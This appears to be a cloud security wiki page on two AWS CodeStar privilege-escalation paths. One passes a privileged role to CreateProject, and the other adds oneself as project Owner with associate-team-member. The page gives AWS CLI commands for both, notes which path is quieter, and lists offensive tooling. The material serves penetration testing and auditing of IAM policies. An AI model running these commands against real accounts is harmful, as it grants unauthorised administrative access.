---
title: "CodeStar: PassRole to CreateProject and team-member self-add"
description: "iam:PassRole with codestar:CreateProject or CreateProjectFromTemplate to execute under the CodeStar service role, and codestar:AssociateTeamMember to self-add as a project owner."
keywords:
  - CodeStar
  - CreateProject
  - AssociateTeamMember
  - PassRole
  - service role
  - privilege escalation
---

# CodeStar

CodeStar carries two separate escalation paths. The first is a `PassRole` path: `codestar:CreateProject` (or `CreateProjectFromTemplate`) with `iam:PassRole` provisions a project whose CloudFormation template runs as a passed service role, executing attacker-defined resources under it. The second needs no `PassRole` at all: `codestar:AssociateTeamMember` lets you add yourself as **Owner** of a CodeStar project, inheriting the project role's access.

## CreateProject with a passed role

```bash
aws codestar create-project --name x --id x \
  --source-code ... --toolchain '{"roleArn":"arn:aws:iam::<acct>:role/<privileged-role>","stackParameters":{}}'
```

The toolchain stack is deployed with the role you pass, so a template that creates an admin policy or access key runs with that role's rights.

## Self-add as project owner

```bash
# grant yourself Owner on an existing project, no PassRole needed
aws codestar associate-team-member --project-id <proj> \
  --user-arn arn:aws:iam::<acct>:user/<me> --project-role Owner --remote-access-allowed
```

CodeStar's own managed policies then extend the project's resource access to you.

## Exploitation notes

- `CreateProjectFromTemplate` (the older API) is the variant most IAM policies still allow and the one the original research used.
- The Owner self-add is the quieter of the two: it changes a membership, not infrastructure, and reuses the project's existing role rather than passing a new one.
- CodeStar is deprecated by AWS but still present in many long-lived accounts, which is exactly where these over-broad grants linger.

## Tools

- **AWS CLI** (`codestar create-project` / `create-project-from-template` / `associate-team-member`).
- **Pacu** (`iam__privesc_scan`): enumerates the PassRole-capable surface.

## References

- [Rhino Security Labs: AWS privilege escalation methods](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
